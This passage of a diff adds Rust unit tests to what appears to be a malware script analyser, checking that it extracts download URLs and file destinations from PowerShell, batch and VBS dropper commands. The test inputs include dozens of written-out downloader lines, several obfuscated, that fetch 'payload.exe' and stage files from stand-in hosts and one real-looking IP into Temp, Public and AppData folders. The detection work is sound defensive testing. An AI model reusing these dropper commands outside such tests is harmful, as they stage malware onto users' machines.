+            r#"@echo off
+>"child.vbs" (
+echo Dim u, x
+echo u = "{url}"
+echo Set x = CreateObject("MSXML2.XMLHTTP")
+echo x.open "GET", u, False
+echo x.send
+)
+wscript //nologo "child.vbs"
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "structured child VBS download missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "structured URL double-emitted as generic: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn generic_url_argument_is_removed_when_structured_download_exists() {
+        let url = "https://dedupe-urlarg.example/payload.exe";
+        let script = format!(r#""C:\Tools\rdl.exe" -LJOk {url}"#);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "structured process download missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::UrlArgument { url: got, .. } if got == url)),
+            "structured process download double-emitted as UrlArgument: {:?}",
             report.traits
         );
     }
@@ -7120,6 +13803,43 @@ mod ps1_url_extraction_tests {
             )
         });
         assert!(has, "no Download trait from IWR: {:?}", report.traits);
+    }
+
+    #[test]
+    fn iwr_quoted_outfile_with_spaces_preserves_destination() {
+        let ps = r#"Invoke-WebRequest -Uri "http://x.example/spaced.exe" -OutFile "C:\Users\Public\stage one.exe""#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://x.example/spaced.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage one.exe")
+            )
+        });
+        assert!(
+            has,
+            "quoted OutFile path with spaces was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_backslash_escaped_quotes_preserve_outfile_destination() {
+        let ps = r#"Invoke-WebRequest -Uri \"https://iwr-escaped.example/stage.msi\" -OutFile \"C:\Users\Public\stage.msi\""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://iwr-escaped.example/stage.msi"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\stage.msi")
+                )
+            }),
+            "backslash-escaped quoted OutFile path was not preserved: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -7160,6 +13880,32 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_quoted_url_trims_terminal_ampersand() {
+        let ps = r#"Invoke-WebRequest -Uri 'https://raw.example/path/payload.exe&' -OutFile 'payload.exe'"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://raw.example/path/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "terminal ampersand was not trimmed from IWR URL: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src.ends_with('&')) }),
+            "terminal ampersand leaked into Download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_downloaddata_concatenated_variable_url_extracted() {
         let ps = r#"$ser=$('http://147.182.170.15:9090');$t='/admin/get.php';$wc=New-Object Net.WebClient;$wc.DownloadData($Ser+$T)"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -7178,6 +13924,100 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_downloadfileasync_preserves_destination() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFileAsync("https://async-webclient.example/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://async-webclient.example/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "DownloadFileAsync destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn webclient_downloadfiletaskasync_preserves_destination() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFileTaskAsync("https://taskasync-webclient.example/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://taskasync-webclient.example/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "DownloadFileTaskAsync destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn webclient_downloadfile_schemeless_domain_path_url_extracted() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFile("cdn-webclient.com/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://cdn-webclient.com/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "schemeless WebClient DownloadFile URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn webclient_openread_concatenated_variable_url_extracted() {
+        let ps = r#"$ser=$('http://198.51.100.7:8080');$t='/stage.bin';$wc=New-Object Net.WebClient;$wc.OpenRead($Ser+$T)"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let expected = "http://198.51.100.7:8080/stage.bin";
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == expected
+            )
+        });
+        assert!(
+            has,
+            "no Download trait for concatenated OpenRead URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn webclient_openreadasync_schemeless_url_extracted() {
+        let ps =
+            r#"$wc=New-Object Net.WebClient;$wc.OpenReadAsync("openreadasync.example/stage.bin")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "http://openreadasync.example/stage.bin"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait for schemeless OpenReadAsync URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_positional_url_after_flags_extracted() {
         let ps = r#"IWR -useb 'https://iwr.example/payload.js' -outf $env:TEMP\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -7190,6 +14030,394 @@ mod ps1_url_extraction_tests {
         assert!(
             has,
             "no Download trait from IWR positional URL after flags: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_schemeless_domain_path_url_extracted_as_structured_download() {
+        let ps = r#"iwr -UseBasicParsing -Uri 'rebrand.ly/47i82k6' -OutFile C:\Temp\payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://rebrand.ly/47i82k6"
+                            && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+                )
+            }),
+            "schemeless IWR domain/path was not extracted as structured Download: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src == "http://rebrand.ly/47i82k6"
+                )
+            }),
+            "schemeless IWR domain/path double-emitted as generic: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_schemeless_uri_abbreviation_after_outfile_extracted() {
+        let ps = r#"Invoke-WebRequest -OutFile C:\Temp\payload.exe -Ur rebrand.ly/47i82k6"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://rebrand.ly/47i82k6"
+                            && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+                )
+            }),
+            "schemeless IWR -Ur after -OutFile was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_outfile_abbreviation_preserves_destination() {
+        let ps = r#"IWR -useb https://iwr-outf.example/payload.js -outf C:\Temp\payload.js"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-outf.example/payload.js"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.js")
+            )
+        });
+        assert!(
+            has,
+            "IWR -outf destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_short_outfile_before_uri_preserves_destination() {
+        let ps = r#"Invoke-WebRequest -Out C:\Temp\short-out.exe -Uri https://iwr-short-out.example/payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-short-out.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\short-out.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR -Out destination before -Uri was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_colon_bound_uri_and_outfile_preserve_destination() {
+        let ps = r#"Invoke-WebRequest -Uri:https://iwr-colon.example/payload.exe -OutF:C:\Temp\colon.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-colon.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\colon.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR colon-bound Uri/OutFile was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_equals_bound_uri_and_outfile_preserve_destination() {
+        let ps = r#"Invoke-WebRequest -Uri=https://iwr-equals.example/payload.exe -OutFile=C:\Temp\equals.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-equals.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\equals.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR equals-bound Uri/OutFile was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_curl_exe_attached_output_preserves_destination() {
+        let ps = r#"C:\Windows\System32\curl.exe -fsSLoC:\Temp\curl-ps.exe https://ps-curl-output.example/payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://ps-curl-output.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\curl-ps.exe")
+            )
+        });
+        assert!(
+            has,
+            "PowerShell curl.exe attached -o destination was not preserved: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == "https://ps-curl")),
+            "curl fallback truncated the hostname at an internal -o marker: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -Headers @{Referer="https://ps-decoy.example/landing"} -Uri https://ps-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-decoy.example/landing"
+                )
+            }),
+            "IWR header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_abbreviated_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -He @{Referer="https://ps-short-header.example/landing"} -Uri https://ps-short-header-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-short-header-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-short-header.example/landing"
+                )
+            }),
+            "IWR abbreviated header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Headers @{Origin="https://ps-origin.example"} -Uri https://ps-irm-actual.example/api"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-irm-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-origin.example"
+                )
+            }),
+            "IRM header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_proxy_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -Proxy "http://proxy.example:8080" -Uri https://ps-proxy-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-proxy-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "http://proxy.example:8080"
+                )
+            }),
+            "IWR proxy URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_useragent_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -UserAgent "Mozilla/5.0 https://ua.example/info" -Uri https://ps-ua-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-ua-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ua.example/info"
+                )
+            }),
+            "IWR UserAgent URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_abbreviated_useragent_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -UserA "Mozilla/5.0 https://ua-short.example/info" -Uri https://ps-ua-short-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-ua-short-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ua-short.example/info"
+                )
+            }),
+            "IWR abbreviated UserAgent URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_body_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Uri https://ps-body-actual.example/api -Method Post -Body "next=https://ps-body-decoy.example/payload.exe""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-decoy.example/payload.exe"
+                )
+            }),
+            "IRM body URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_abbreviated_body_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Uri https://ps-short-body-actual.example/api -Method Post -Bo "next=https://ps-short-body-decoy.example/payload.exe""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-short-body-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-short-body-decoy.example/payload.exe"
+                )
+            }),
+            "IRM abbreviated body URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_body_hash_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Uri https://ps-body-hash-actual.example/api -Method Post -Body @{next="https://ps-body-hash-decoy.example/payload.exe"}"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-hash-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-hash-decoy.example/payload.exe"
+                )
+            }),
+            "IRM body hash URL was promoted to Download: {:?}",
             report.traits
         );
     }
@@ -7453,6 +14681,180 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn start_bitstransfer_destination_before_source_is_bounded() {
+        let ps = r#"Start-BitsTransfer -Destination C:\Temp\bits.exe -Source https://bits-order.example/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bits-order.example/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS destination before source was not bounded: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_destination_abbreviation_extracted() {
+        let ps =
+            r#"Start-BitsTransfer -Dest C:\Temp\bits.exe -S https://bits-alias.example/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bits-alias.example/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS -Dest abbreviation was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_schemeless_source_extracted() {
+        let ps = r#"Start-BitsTransfer -Destination C:\Temp\bits.exe -Source bits-schemeless.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-schemeless.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS schemeless -Source was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_equals_bound_schemeless_source_extracted() {
+        let ps =
+            r#"Start-BitsTransfer -Destination=C:\Temp\bits.exe -Source=bits-equals.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-equals.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS equals-bound schemeless -Source was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_colon_bound_source_and_destination_extracted() {
+        let ps =
+            r#"Start-BitsTransfer -Destination:C:\Temp\bits.exe -Source:bits-colon.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-colon.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS colon-bound source/destination was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_source_prefix_schemeless_source_extracted() {
+        let ps = r#"Start-BitsTransfer -Dest C:\Temp\bits.exe -So bits-source-prefix.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-source-prefix.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS -Source prefix abbreviation was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_proxylist_url_is_not_promoted_to_download() {
+        let ps = r#"Start-BitsTransfer -ProxyList http://bits-proxy.example:8080 -Source https://bits-proxy-actual.example/bits.exe -Destination C:\Temp\bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://bits-proxy-actual.example/bits.exe"
+                            && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+                )
+            }),
+            "actual BITS source URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://bits-proxy.example:8080"
+                )
+            }),
+            "BITS proxy URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_abbreviated_proxylist_url_is_not_promoted_to_download() {
+        let ps = r#"Start-BitsTransfer -ProxyL http://bits-proxy-short.example:8080 -Source https://bits-proxy-short-actual.example/bits.exe -Destination C:\Temp\bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://bits-proxy-short-actual.example/bits.exe"
+                            && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+                )
+            }),
+            "actual BITS source URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://bits-proxy-short.example:8080"
+                )
+            }),
+            "BITS abbreviated ProxyList URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_downloadfile_variable_url_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "http://download.example/tool.exe"
@@ -7462,12 +14864,124 @@ $clnt.DownloadFile($url,$file)
         let report = analyze(script.as_bytes(), &Config::default());
         let has = report.traits.iter().any(|t| {
             matches!(t,
-                Trait::Download { src, .. } if src == "http://download.example/tool.exe"
+                Trait::Download { src, dst, .. }
+                    if src == "http://download.example/tool.exe"
+                        && dst.as_deref() == Some("C:\\ProgramData\\tool.exe")
             )
         });
         assert!(
             has,
-            "no Download from raw PowerShell DownloadFile variable URL: {:?}",
+            "no Download from raw PowerShell DownloadFile variable URL/destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_dynamic_downloadfile_invoke_preserves_destination() {
+        let script = r#"$clnt = New-Object System.Net.WebClient
+$url = "https://dynamic-downloadfile.example/tool.exe"
+$file = "$env:APPDATA\tool.exe"
+$method = "DownloadFile"
+$clnt.$method.Invoke($url,$file)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://dynamic-downloadfile.example/tool.exe"
+                        && dst.as_deref() == Some("$env:APPDATA\\tool.exe")
+            )
+        });
+        assert!(
+            has,
+            "dynamic DownloadFile.Invoke destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_dynamic_downloadfile_invoke_resolves_chained_env_destination() {
+        let script = r#"$global:nonferociousness=$env:appdata+'\Allitterationers234.Afs'
+$simultantolkedes=$nonferociousness
+$boliganvisninger=New-Object Net.WebClient
+$boliganvisninger.'DownloadFile'.Invoke('https://dynamic-chained-dst.example/stage.txt',$simultantolkedes)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://dynamic-chained-dst.example/stage.txt"
+                        && dst.as_deref() == Some("$env:appdata\\Allitterationers234.Afs")
+            )
+        });
+        assert!(
+            has,
+            "dynamic DownloadFile.Invoke chained env destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_downloadfile_path_combine_destination_extracted() {
+        let script = r#"$clnt = New-Object System.Net.WebClient
+$url = "https://download-path-combine.example/setup.exe"
+$exeFile = [System.IO.Path]::Combine($env:TEMP, 'setup.exe')
+$clnt.DownloadFile($url,$exeFile)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://download-path-combine.example/setup.exe"
+                        && dst.as_deref() == Some("$env:TEMP\\setup.exe")
+            )
+        });
+        assert!(
+            has,
+            "Path.Combine destination variable was not recovered for DownloadFile: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_mixed_case_downloadfile_variable_url_extracted() {
+        let script = r#"$clnt = New-Object System.Net.WebClient
+$url = "http://download-case.example/tool.exe"
+$file = "C:\ProgramData\tool.exe"
+$clnt.DoWnLoAdFiLe($url,$file)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://download-case.example/tool.exe"
+                        && dst.as_deref() == Some("C:\\ProgramData\\tool.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download from mixed-case PowerShell DownloadFile variable URL/destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_invoke_webrequest_variable_url_extracted() {
+        let script = r#"$url = "https://raw-iwr.example/stage.zip"
+$outputPath = "$env:TEMP\stage.zip"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://raw-iwr.example/stage.zip"
+                        && dst.as_deref() == Some("$outputPath")
+            )
